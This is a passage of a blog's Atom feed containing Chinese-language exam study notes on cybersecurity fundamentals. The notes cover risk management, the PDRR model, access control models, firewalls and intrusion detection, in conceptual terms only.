<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ethanyi&#39;s Blog</title>
  
  
  <link href="https://thanyi.github.io/atom.xml" rel="self"/>
  
  <link href="https://thanyi.github.io/"/>
  <updated>2023-10-05T08:47:19.976Z</updated>
  <id>https://thanyi.github.io/</id>
  
  <author>
    <name>ethanyi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网络空间安全技术笔记</title>
    <link href="https://thanyi.github.io/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/"/>
    <id>https://thanyi.github.io/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/</id>
    <published>2023-10-05T08:42:08.000Z</published>
    <updated>2023-10-05T08:47:19.976Z</updated>
    
    <content type="html"><![CDATA[<img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/image-20231005161503591.png" class title="image-20231005161503591"><h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h1><h2 id="什么是信息安全："><a href="#什么是信息安全：" class="headerlink" title="什么是信息安全："></a>什么是信息安全：</h2><p>本质上：</p><p>保护系统的硬件，软件，数据、<br>防止系统和数据遭受破坏，更改，泄露、<br>保证系统连续可靠正常地运行，服务不中断</p><p>两个层面：技术层面 管理层面</p><h2 id="信息安全基本目标"><a href="#信息安全基本目标" class="headerlink" title="信息安全基本目标"></a>信息安全基本目标</h2><p>CIA：<br><strong>机密性（Confidentiality）<br>完整性（Integrity）<br>可用性（Availability）</strong></p><h2 id="网络空间四要素（简答题）"><a href="#网络空间四要素（简答题）" class="headerlink" title="网络空间四要素（简答题）"></a>网络空间四要素（简答题）</h2><ul><li>网络空间资源：数据，也叫网络操作对象</li><li>网络空间载体：设施</li><li>网络活动主体：用户</li><li>网络活动形式：操作</li></ul><h2 id="网络空间的定义"><a href="#网络空间的定义" class="headerlink" title="网络空间的定义"></a>网络空间的定义</h2><p>是一个<strong>人造的电磁空间</strong>，以。。。(如各种计算机系统、互联网、各种通信系统和电信网。。。)为载体，用户通过在其上对数据进行创造、存储、改变、传输、使用、展示等操作，以实现特定的信息通信技术活动</p><h2 id="网络空间安全的四层次模型"><a href="#网络空间安全的四层次模型" class="headerlink" title="网络空间安全的四层次模型"></a>网络空间安全的四层次模型</h2><p>信息系统都会涉及的四个层面：</p><ul><li>设备层：电磁设备</li><li>系统层：电子信息系统</li><li>数据层：运行数据</li><li>应用层：系统应用</li></ul><h2 id="网络空间安全四大基础构建模块"><a href="#网络空间安全四大基础构建模块" class="headerlink" title="网络空间安全四大基础构建模块"></a>网络空间安全四大基础构建模块</h2><ul><li>信息安全</li><li>应用安全</li><li>网络安全</li><li>因特网安全</li></ul><h1 id="2-风险管理"><a href="#2-风险管理" class="headerlink" title="2 风险管理"></a>2 风险管理</h1><h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><ul><li>风险管理的定义</li><li>安全风险分析思路</li><li>安全风险分析处置</li></ul><h2 id="风险定义"><a href="#风险定义" class="headerlink" title="风险定义"></a>风险定义</h2><ul><li>人为的或自然的威胁，<strong>利用</strong>信息系统及其管理体系中存在的<strong>脆弱性</strong>导致安全事件的发生及其对组织造成的影响。</li></ul><p>只考虑那些对组织产生负面影响的事件。</p><p>了解风险+控制风险=管理风险</p><h2 id="风险识别"><a href="#风险识别" class="headerlink" title="风险识别"></a>风险识别</h2><p>包含：</p><ul><li>资产：任何对组织有价值的东西，是要保护的对象。</li><li>脆弱性：与信息资产有关的弱点或安全隐患。</li><li>威胁：一切导致安全事件发生的原因</li></ul><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/55dbff5bece04a4584997cf168ec80af.png" class title="在这里插入图片描述"><h2 id="什么是风险管理（简答题）"><a href="#什么是风险管理（简答题）" class="headerlink" title="什么是风险管理（简答题）"></a>什么是风险管理（简答题）</h2><ul><li><strong>识别、控制、消除或者最小化</strong>可能影响系统资源的<strong>不确定因素</strong>的过程。</li><li>在组织机构内部<strong>识别、优化、管理</strong>风险，使<strong>风险降低到可接受水平</strong>的过程。</li></ul><h2 id="常用的四类风险处置方法"><a href="#常用的四类风险处置方法" class="headerlink" title="常用的四类风险处置方法"></a>常用的四类风险处置方法</h2><ul><li>减低风险 </li><li>转移风险 </li><li>规避风险 </li><li>接受风险</li></ul><h2 id="风险评估、检查评估、等级保护测评"><a href="#风险评估、检查评估、等级保护测评" class="headerlink" title="风险评估、检查评估、等级保护测评"></a>风险评估、检查评估、等级保护测评</h2><p>检查评估和等保测评在底层，都是符合性测评</p><p>风险评估在这俩上层</p><ul><li><p>等级保护测评：<strong>符合国家安全要求</strong>的测评</p></li><li><p>检查评估：<strong>符合行业主管安全要求</strong>的测评</p></li><li><p>风险评估：以<strong>被评估系统特定安全要求</strong>为目标展开的<strong>风险识别、风险分析、风险评价</strong></p></li></ul><h2 id="风险评估流程（小心简答题）"><a href="#风险评估流程（小心简答题）" class="headerlink" title="风险评估流程（小心简答题）"></a>风险评估流程（小心简答题）</h2><ul><li>风险评估准备</li><li>风险要素识别</li><li>风险分析</li><li>风险处理</li></ul><h2 id="国产化替代"><a href="#国产化替代" class="headerlink" title="国产化替代"></a>国产化替代</h2><p>替代的是被垄断的国外产品</p><h1 id="3-网络空间安全保障和安全运维"><a href="#3-网络空间安全保障和安全运维" class="headerlink" title="3 网络空间安全保障和安全运维"></a>3 网络空间安全保障和安全运维</h1><h2 id="PDRR模型（简答题）"><a href="#PDRR模型（简答题）" class="headerlink" title="PDRR模型（简答题）"></a>PDRR模型（简答题）</h2><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/b6dcdd73b2d144708915bcd80751bff8.png" class title="在这里插入图片描述"><p>该模型强调的是自动故障回复能力</p><ul><li>   保护（Protect）</li><li>   检测（Detect）</li><li>   反应（React）</li><li>   恢复（Restore）</li></ul><h3 id="数学模型"><a href="#数学模型" class="headerlink" title="数学模型"></a>数学模型</h3><ul><li>Pt：有效防御攻击的时间</li><li>Dt：发起攻击到检测到攻击时间</li><li>Rt：检测到攻击到处理完的时间</li><li>Et：暴露时间（在系统不安全的时候出现）</li></ul><p>结果：</p><ul><li><p>Pt &gt; Dt+Rt ：系统安全</p></li><li><p>Pt &lt; Dt+Rt 系统不安全，暴露时间Et = Dt + Rt - Pt</p></li></ul><h2 id="深度防御"><a href="#深度防御" class="headerlink" title="深度防御"></a>深度防御</h2><p><strong>信息保障技术框架（Information Assurance Technical Framework）</strong></p><ul><li>NSA制定的，为保护美国政府和工业界的信息与信息技术设施提供技术指南。</li><li>代表理论为“<strong>深度防御（Defense-in-Depth）</strong>”</li><li>在关于实现信息保障目标的过程和方法上，信息保障技术框架论述了 <ul><li>系统工程</li><li>系统采购</li><li>风险管理、鉴别和鉴定</li><li>生命周期支持<br>等过程，指出了一条较为清晰的建设信息保障体系的路子。</li></ul></li></ul><h2 id="什么是深度防御（简答题）"><a href="#什么是深度防御（简答题）" class="headerlink" title="什么是深度防御（简答题）"></a>什么是深度防御（简答题）</h2><ul><li><p>强调人、技术、操作这三个核心要素，从多种不同的角度对信息系统进行防护</p></li><li><p>关注四个信息安全保障领域：</p><ul><li> 本地计算环境</li><li> 区域边界</li><li> 网络和基础设施</li><li> 支撑性基础设施</li></ul></li><li><p>在此基础上，对信息系统可以做到多层防护，实现组织的任务/业务运作。</p></li></ul><p>这样的防护被称为 “深度防护战略（Defense-in-Depth Strategy）”。</p><h1 id="4-网络空间安全技术体系与技术"><a href="#4-网络空间安全技术体系与技术" class="headerlink" title="4 网络空间安全技术体系与技术"></a>4 网络空间安全技术体系与技术</h1><p>分为</p><ul><li><strong>网络空间安全技术体系</strong></li><li><strong>网络空间安全技术机制</strong></li></ul><h2 id="安全机制和安全服务"><a href="#安全机制和安全服务" class="headerlink" title="安全机制和安全服务"></a>安全机制和安全服务</h2><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/b53d84138c584c29b4cd07fbeefb997c.png" class title="在这里插入图片描述"><h3 id="1-安全机制"><a href="#1-安全机制" class="headerlink" title="1. 安全机制"></a>1. 安全机制</h3><p>保护和保障信息系统安全的一种和一类技术总称</p><p><strong>八种基本的安全机制</strong>：</p><ul><li>   加密</li><li>   数字签名</li><li>   访问控制</li><li>   数据完整性</li><li>   鉴别交换</li><li>   通信业务流填充</li><li>   路由选择</li><li>   公证</li></ul><p>除此之外的安全机制：</p><p>安全审计跟踪等</p><h4 id="1-1-加密机制"><a href="#1-1-加密机制" class="headerlink" title="1.1 加密机制"></a>1.1 加密机制</h4><p>消息鉴别的三种方式：</p><ul><li>Message encryption：用整个信息的密文作为鉴别标识</li><li>Hash function：将任意长度的消息映射在固定长度的字符上作为鉴别标识</li><li>MAC：一个公开函数，加上一个密钥产生一个固定长度的值作为标识</li></ul><h4 id="1-2-数据签名机制"><a href="#1-2-数据签名机制" class="headerlink" title="1.2 数据签名机制"></a>1.2 数据签名机制</h4><p>作用：</p><ul><li>身份鉴别</li><li>防假冒</li><li>抗抵赖</li><li>防数据篡改</li><li>在Web商务中有重大意义</li></ul><p>性质：</p><ul><li>抗抵赖性</li><li>不可伪造性</li><li>保证消息完整性</li></ul><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/6799fe307c144f26ac37f945986ebb16.png" class title="在这里插入图片描述"><h4 id="1-3-数据完整性机制"><a href="#1-3-数据完整性机制" class="headerlink" title="1.3 数据完整性机制"></a>1.3 数据完整性机制</h4><p>数据完整性包含有两种形式：<br>一种是数据单元完整性、一种是数据单元序列完整性</p><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/87f4c0dc3ba34fd181fc3b1a36cd964e.png" class title="在这里插入图片描述"><h4 id="1-4-访问控制机制"><a href="#1-4-访问控制机制" class="headerlink" title="1.4 访问控制机制"></a>1.4 访问控制机制</h4><ul><li>访问控制模型：对一系列访问控制规则集合的描述，可以是非形式化的，也可以是形式化的。</li></ul><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/bbe71311159848b397d3edee383046e4.png" class title="在这里插入图片描述"><h3 id="2-五种安全服务"><a href="#2-五种安全服务" class="headerlink" title="2. 五种安全服务"></a>2. 五种安全服务</h3><p>加强数据处理系统和信息传输的安全性的一类服务，<strong>利用一种或者多种安全机制</strong>保障信息系统安全</p><p><strong>五种安全服务：</strong></p><ul><li>鉴别服务</li><li>访问控制服务</li><li>数据机密性服务</li><li>数据完整性服务</li><li>抗抵赖性服务</li></ul><p>日志或记录被视为一种安全机制，而分析和报告生成被视为一种安全管理功能。</p><h2 id="完整的网络空间安全体系框架"><a href="#完整的网络空间安全体系框架" class="headerlink" title="完整的网络空间安全体系框架"></a>完整的网络空间安全体系框架</h2><ul><li>技术体系</li><li>组织机构体系</li><li>管理体系</li></ul><h3 id="技术体系"><a href="#技术体系" class="headerlink" title="技术体系"></a>技术体系</h3><p>技术机制、技术管理</p><h3 id="组织机构体系"><a href="#组织机构体系" class="headerlink" title="组织机构体系"></a>组织机构体系</h3><p>机构、岗位、人事三个模块构成一个体系</p><ul><li><p>机构：决策层、管理层、执行层</p></li><li><p>岗位：信息安全管理机关设定的一个或几个安全事务的岗位</p></li><li><p>人事机构：对岗位上的在职、待职和离职的雇员进行素质教育、业绩考核和安全监管的机构</p></li></ul><h3 id="管理体系"><a href="#管理体系" class="headerlink" title="管理体系"></a>管理体系</h3><p>是信息系统<strong>安全的灵魂</strong>。</p><p>分为法律管理、制度管理、培训管理</p><ul><li><p>   法律管理：根据国家法律、法规对信息系统主体及其外界关联行为进行的规范和约束</p></li><li><p>   制度管理：信息系统内部依据系统必要的国家、团体的安全需求制定的一系列内部规章制度</p></li><li><p>   培训管理是确保信息系统安全的前提</p></li></ul><h1 id="5-鉴别技术"><a href="#5-鉴别技术" class="headerlink" title="5 鉴别技术"></a>5 鉴别技术</h1><p><strong>鉴别可以对抗假冒攻击的危险</strong></p><h2 id="主动攻击和被动攻击"><a href="#主动攻击和被动攻击" class="headerlink" title="主动攻击和被动攻击"></a>主动攻击和被动攻击</h2><ul><li><p>被动攻击：窃听，不对消息做出任何修改，不影响原来的业务流</p></li><li><p>主动攻击：阻断、伪造、重放</p></li></ul><h2 id="实现身份鉴别的途径"><a href="#实现身份鉴别的途径" class="headerlink" title="实现身份鉴别的途径"></a>实现身份鉴别的途径</h2><ul><li>基于你知道的<ul><li>口令、密码</li></ul></li><li>基于你拥有的<ul><li>身份证、钥匙等</li></ul></li><li>基于你的个人特征<ul><li>指纹、虹膜等</li></ul></li></ul><h2 id="基于质询－应答的身份鉴别技术"><a href="#基于质询－应答的身份鉴别技术" class="headerlink" title="基于质询－应答的身份鉴别技术"></a>基于质询－应答的身份鉴别技术</h2><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/44f6d9f4e7ea403ea2ecdd6a3971dcb4.png" class title="在这里插入图片描述"><p>基于质询—应答的身份鉴别在鉴别时，由验证者给声称者发送一个确定的值（质询消息），该值参与鉴别信息的运算。</p><p>产生的非重复质询消息完全由验证者决定，使得每次传输的鉴别信息不同。这能很好地防止口令窃听和重放，但需要额外的通信花销。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>质询—响应的身份鉴别，其安全性取决于</p><ul><li>散列函数的安全性；</li><li>由于是单向鉴别，还存在着验证者的假冒和重放攻击。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>询问/应答方法不适应非连接性的应用，因为它要求在传输开始之前先有握手的额外开销，这就抵消了无连接通信的主要特点。</p><h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="2-画图说明中间人攻击原理"><a href="#2-画图说明中间人攻击原理" class="headerlink" title="2. 画图说明中间人攻击原理"></a>2. 画图说明中间人攻击原理</h3><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZXRoYW55aTk=,size_20,color_FFFFFF,t_70,g_se,x_16.png" class title="在这里插入图片描述"><h1 id="6-访问控制技术"><a href="#6-访问控制技术" class="headerlink" title="6 访问控制技术"></a>6 访问控制技术</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>访问控制</strong>：针对<strong>越权使用资源</strong>的防御措施</p><p>访问的三要素：</p><ul><li>主体：用户、程序、进程等，可以操作客体的相关信息或数据</li><li>客体：文件、存储介质、程序、进程等，被操作的对象</li><li>访问操作：对资源的使用，读、写、修改、删除等操作</li></ul><h2 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h2><p>对一系列访问控制规则集合的描述，可以是非形式化的，也可以是形式化的。</p><ul><li>主体</li><li>客体</li><li>访问控制执行功能</li><li>访问控制决策功能<img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/c29758b6a6a440b4a890d91e1a7e8829.png" class title="在这里插入图片描述">常用实现方法：</li><li>访问控制表ACL：每个客体拥有的主体列表</li><li>访问能力表（Capabilities List)：每个主体有的客体列表</li><li><strong>访问控制矩阵</strong>：每一行是能力表，每一列是访问控制表<img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/eae619c406da47e093458481d8c3f6a5.png" class title="在这里插入图片描述"><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/bcc4f0abc7334939b056bebbb6d046f8.png" class title="在这里插入图片描述"><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/94d4e63d06e2465bb764d5298ea4e94b.png" class title="在这里插入图片描述">访问控制矩阵：每一行是一个主体（用户），每一列是一个客体（文件、资源等）。<br>同时，单独看每一列是一个访问控制表，每一列是一个能力表。</li></ul><h2 id="访问控制模型的分类"><a href="#访问控制模型的分类" class="headerlink" title="访问控制模型的分类"></a>访问控制模型的分类</h2><ul><li>自主访问控制模型（DAC）</li><li>强制访问控制模型（MAC）</li><li>基于角色的访问控制模型（RBAC）</li></ul><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/2a52780b142642029bc013365545cb44.png" class title="在这里插入图片描述"><h2 id="1-自主访问控制-DAC：Discretionary-Access-Control"><a href="#1-自主访问控制-DAC：Discretionary-Access-Control" class="headerlink" title="1. 自主访问控制  DAC：Discretionary Access Control"></a>1. 自主访问控制  DAC：Discretionary Access Control</h2><ul><li><p><strong>DAC</strong>是<strong>一种分布式授权管理的模式</strong></p></li><li><p>允许客体的创造者决定主体对客体的访问权限</p></li><li><p>使用访问控制表（Access Control Lists）、访问能力表（Capacity List）</p></li></ul><h2 id="2-强制访问控制-MAC：Mandatory-Access-Control"><a href="#2-强制访问控制-MAC：Mandatory-Access-Control" class="headerlink" title="2. 强制访问控制 MAC：Mandatory Access Control"></a>2. 强制访问控制 MAC：<strong>Mandatory Access Control</strong></h2><ul><li>每个主体和客体分配一个固定的安全级别，只有系统管理员才可以修改</li><li>只有在主体和客体的安全级别满足一定规则时，才允许访问</li><li><strong>客体的属主</strong>无权控制客体的访问权限</li></ul><p><strong>四种强制访问控制策略规定</strong>：</p><ul><li>主体对客体：下读/上写、上读/下写</li><li>将主体和客体分级，根据主体和客体的级别标记来决定访问模式。</li><li>通过梯度安全标签实现单向信息流通模式</li></ul><p>其中上读：是指客体在主体之上时可以进行读取（向上读）</p><p>其余的类似</p><ul><li><p>上读/下写：保证<strong>数据完整性</strong>，不保证<strong>数据机密性</strong></p></li><li><p>下读/上写：保证数据机密性</p></li></ul><h3 id="Bell－LaPadula-BLP-模型"><a href="#Bell－LaPadula-BLP-模型" class="headerlink" title="Bell－LaPadula(BLP)模型"></a>Bell－LaPadula(BLP)模型</h3><ul><li>下读/上写</li><li>保证<strong>机密性</strong></li><li>应用：<strong>防火墙</strong></li></ul><h3 id="Biba模型"><a href="#Biba模型" class="headerlink" title="Biba模型"></a>Biba模型</h3><ul><li>上读/下写</li><li>保证<strong>完整性</strong></li><li>应用：Web服务器</li></ul><h3 id="Lattice模型"><a href="#Lattice模型" class="headerlink" title="Lattice模型"></a>Lattice模型</h3><ul><li>下读/下写</li><li>只有主体安全级别大于客体才能读写</li></ul><h2 id="3-基于角色的访问控制-Role-Based-Access-Control"><a href="#3-基于角色的访问控制-Role-Based-Access-Control" class="headerlink" title="3. 基于角色的访问控制 (Role Based Access Control)"></a>3. 基于角色的访问控制 (Role Based Access Control)</h2><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZXRoYW55aTk=,size_20,color_FFFFFF,t_70,g_se,x_16-1696495347300-1.png" class><h1 id="7-防火墙技术"><a href="#7-防火墙技术" class="headerlink" title="7 防火墙技术"></a>7 防火墙技术</h1><h2 id="防火墙的定义（简答）"><a href="#防火墙的定义（简答）" class="headerlink" title="防火墙的定义（简答）"></a>防火墙的定义（简答）</h2><p>防火墙：网络间提供<strong>安全连接</strong>的设备，用于<strong>实现和执行</strong>网络之间通信的<strong>安全策略</strong></p><h2 id="防火墙的分类"><a href="#防火墙的分类" class="headerlink" title="防火墙的分类"></a>防火墙的分类</h2><p>从实现方式上：</p><ul><li>硬件防火墙</li><li>软件防火墙</li></ul><p>按发展阶段：</p><ul><li><p>包过滤：网络层</p></li><li><p>应用代理：应用层</p></li><li><p>状态检测：2-4层 也就是关注TCP连接的特性，关注整个连接</p></li><li><p>完全内容检测：工作在2-7层</p></li></ul><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/image-20231005161537362.png" class title="image-20231005161537362"><h2 id="防火墙的五个基本功能"><a href="#防火墙的五个基本功能" class="headerlink" title="防火墙的五个基本功能"></a>防火墙的五个基本功能</h2><ul><li>过滤进出数据</li><li>管理进出访问行为</li><li>封堵某些业务</li><li>记录通过防火墙的信息内容和活动</li><li>对网络攻击的检测和告警</li></ul><h2 id="防火墙的常见功能"><a href="#防火墙的常见功能" class="headerlink" title="防火墙的常见功能"></a>防火墙的常见功能</h2><p>地址转换、访问控制、VLAN支持、带宽管理、入侵检测/攻击防御、用户认证、IP/MAC绑定</p><p>动态IP转换、数据库长连接应用支持、路由支持、ADSL拨号、SNMP网管支持、日志审计、高可用性</p><h2 id="衡量防火墙性能的五大指标（简答题）"><a href="#衡量防火墙性能的五大指标（简答题）" class="headerlink" title="衡量防火墙性能的五大指标（简答题）"></a>衡量防火墙性能的五大指标（简答题）</h2><ul><li>吞吐量</li><li>时延</li><li>丢包率</li><li>背靠背：考察防火墙为保证连续不丢包所具备的缓冲能力，当网络流量突增而防火墙一时无法处理时，可以把数据包先缓存起来再发送</li><li>并发连接数：穿越防火墙的主机之间或者主机和防火墙之间能建立的最大连接数</li></ul><h2 id="防火墙的接入方式"><a href="#防火墙的接入方式" class="headerlink" title="防火墙的接入方式"></a>防火墙的接入方式</h2><ul><li>透明接入方式：防火墙相当于网桥，网络结构并没有变化</li><li>路由接入方式：防火墙相当于一个简单的路由器</li><li>混合接入方式：同一个防火墙包含了两种接入模式</li></ul><p>混合接入的时候是对不同的子网是路由接入模式，同一子网是透明接入</p><h2 id="企业防火墙的部署案例"><a href="#企业防火墙的部署案例" class="headerlink" title="企业防火墙的部署案例"></a>企业防火墙的部署案例</h2><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/image-20231005163342976.png" class title="image-20231005163342976"><h1 id="8-入侵检测技术"><a href="#8-入侵检测技术" class="headerlink" title="8 入侵检测技术"></a>8 入侵检测技术</h1><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/a90470b401584d208ca715bea26d30e3.png" class title="在这里插入图片描述"><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>入侵检测（Intrusion Detection）：是对入侵行为的发觉。通过对计算机网络或计算机系统的关键点采集信息，发现网络或系统中否有违反安全策略的行为。<br>入侵检测系统（IDS）：是实现入侵检测功能的<strong>软件硬件</strong>的结合</p><h2 id="入侵检测技术模型（三种）"><a href="#入侵检测技术模型（三种）" class="headerlink" title="入侵检测技术模型（三种）"></a>入侵检测技术模型（三种）</h2><ul><li>通用入侵检测模型（Denning模型）</li><li>层次化入侵检测模型（IDM）</li><li>管理式入侵检测模型（SNMP-IDSM） </li></ul><h3 id="通用入侵检测模型（Denning模型）"><a href="#通用入侵检测模型（Denning模型）" class="headerlink" title="通用入侵检测模型（Denning模型）"></a>通用入侵检测模型（Denning模型）</h3><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/2d256ee3d55c488b91e95778fe8f99ac.png" class title="在这里插入图片描述"><h3 id="层次化入侵检测模型IDM"><a href="#层次化入侵检测模型IDM" class="headerlink" title="层次化入侵检测模型IDM"></a>层次化入侵检测模型IDM</h3><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/f6dedf80a0c44148a9dfc5cd2c15e32c.png" class title="在这里插入图片描述"><h3 id="管理式入侵检测模型（SNMP-IDSM）"><a href="#管理式入侵检测模型（SNMP-IDSM）" class="headerlink" title="管理式入侵检测模型（SNMP-IDSM）"></a>管理式入侵检测模型（SNMP-IDSM）</h3><p>定义了用来描述入侵事件的管理信息库（MIB）</p><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/eb41cf8ab38e470490401b854eb55237.png" class title="在这里插入图片描述"><h2 id="入侵检测技术通用模型（CIDF）"><a href="#入侵检测技术通用模型（CIDF）" class="headerlink" title="入侵检测技术通用模型（CIDF）"></a>入侵检测技术通用模型（CIDF）</h2><ul><li>事件生成器</li><li>事件分析器</li><li>事件数据库</li><li>事件响应器<img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/8e311b59b37342b6a3fedcfd15dae581.png" class title="在这里插入图片描述"></li></ul><h2 id="入侵检测系统分类"><a href="#入侵检测系统分类" class="headerlink" title="入侵检测系统分类"></a>入侵检测系统分类</h2><h3 id="1-按检测分析技术"><a href="#1-按检测分析技术" class="headerlink" title="1 按检测分析技术"></a>1 按检测分析技术</h3><h4 id="1-1-异常检测："><a href="#1-1-异常检测：" class="headerlink" title="1.1 异常检测："></a>1.1 异常检测：</h4><ul><li>首先建立起用户的正常使用模式，即知识库；</li><li>自适应、自学习功能；</li><li>实现难度较大</li></ul><h4 id="1-2-特征检测："><a href="#1-2-特征检测：" class="headerlink" title="1.2 特征检测："></a>1.2 特征检测：</h4><ul><li>也称为误用检测</li><li>是针对已知（类似）的攻击行为和间接的违背系统安全策略行为的检测；</li><li>建立攻击和系统漏洞库是特征检测的基础。</li><li>准确率高、算法简单。</li><li>特征库要不断更新（动态性），无法检测新的入侵。</li></ul><h3 id="2-按检测范围"><a href="#2-按检测范围" class="headerlink" title="2  按检测范围"></a>2  按检测范围</h3><ul><li>基于主机</li><li>基于网络</li><li>基于网络节点</li></ul><h4 id="2-1-基于主机的入侵检测系统"><a href="#2-1-基于主机的入侵检测系统" class="headerlink" title="2.1 基于主机的入侵检测系统"></a>2.1 基于主机的入侵检测系统</h4><ul><li>以代理软件的形式安装在主机或者服务器上</li></ul><p>分为</p><ul><li><strong>网络连接检测</strong><ul><li>可以有效地检测出是否存在攻击探测行为，攻击探测几乎是所有攻击行为的前奏。</li><li>未经授权的连接也列入检测对象</li></ul></li><li><strong>主机文件检测</strong><ul><li> 检测对象主要包括<ul><li>   系统日志：不正常的反复登录失败记录、未授权用户越权访问重要文件、非正常登录行为</li><li>   文件系统：目录或文件被非正常地创建、修改或删除</li><li>   进程记录：进程被分解，致使程序中止</li></ul></li></ul></li></ul><h4 id="2-2-基于网络的入侵检测系统（优点和缺点注意）"><a href="#2-2-基于网络的入侵检测系统（优点和缺点注意）" class="headerlink" title="2.2 基于网络的入侵检测系统（优点和缺点注意）"></a>2.2 基于网络的入侵检测系统（优点和缺点注意）</h4><ul><li>以混杂模式接入网络</li><li>感应器可部署在网络的关键位置</li><li>将日志/告警信息发送至服务器</li></ul><p>注意：</p><ul><li>基于网络的入侵检测系统通常是作为一个独立的个体放置于被保护的网络上</li><li>使用原始的网络分组数据包作为进行攻击分析的数据源</li></ul><p>优点：</p><ul><li>不需重新配置或重定向日志机制即可快速获取信息；</li><li>实时监视与检测网络攻击或误用；</li><li>使用原始的网络分组数据包作为进行攻击分析的数据源</li><li>其部署不影响现有的网络架构或数据源；</li><li>与操作系统无关、不会增加系统开销。</li></ul><p>缺点：</p><ul><li>无法分析加密的数据；</li><li>从网络流量可以推断发生了什么，但不能判断结果</li><li>对全交换网络需要配置交换机端口镜像；</li><li>对于带宽的要求较高。</li></ul><h2 id="IDS的两个指标（小心简答）"><a href="#IDS的两个指标（小心简答）" class="headerlink" title="IDS的两个指标（小心简答）"></a>IDS的两个指标（小心简答）</h2><ul><li>漏报率</li><li>误报率</li></ul><h1 